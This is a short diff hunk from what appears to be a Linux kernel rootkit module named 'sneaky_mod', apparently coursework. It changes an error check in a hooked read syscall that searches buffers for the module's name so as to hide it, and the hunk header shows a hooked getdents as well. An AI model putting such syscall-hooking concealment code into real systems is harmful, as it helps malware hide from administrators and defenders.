@@ -83,7 +83,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 //Define our new sneaky version of the 'read' syscall
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   ssize_t num = original_read(fd, buf, count);
-  if (num == -1) { return num; }
+  if (num <= 0) { return num; }
   void *pos = strnstr(buf, "sneaky_mod", num);
   if (pos == NULL) { return num; }
   void *end = strnstr(pos, "\n", num - (pos - buf));
